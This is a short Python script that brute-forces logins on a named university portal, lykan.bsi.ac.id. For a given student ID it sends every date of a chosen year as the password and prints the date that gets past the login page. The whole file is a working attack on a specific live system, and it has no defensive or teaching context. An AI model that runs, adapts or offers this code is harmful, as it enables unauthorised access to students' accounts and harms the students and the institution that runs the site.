from time import sleep
import requests
from datetime import datetime
from datetime import timedelta


def bruteforce(year, nim):
    print("START : ", nim, " -> ", year)
    url = "http://lykan.bsi.ac.id/verifikasi.html"

    password = datetime(year, 1, 1)

    continue_hack = True
    while continue_hack:
        try:
            payload = {'nip': nim, 'pwd': password.strftime("%Y-%m-%d")}
            files = []
            headers = {}

            response = requests.request("POST",
                                        url,
                                        headers=headers,
                                        data=payload,
                                        files=files)

            if response.text.__contains__("Salah!"):
                continue_hack = True
                password += timedelta(days=1)
            elif response.text.__contains__("beranda.html"):
                continue_hack = False
                print("BENAR : ", password.strftime("%Y-%m-%d"))
            else:
                print("ERROR : ", response.text)

        except:
            print("ERROR : ", password.strftime("%Y-%m-%d"))
            sleep(3)

        if year != password.year:
            print("END : ", year)
            continue_hack = False

    print("END : ", nim, " -> ", year)
    return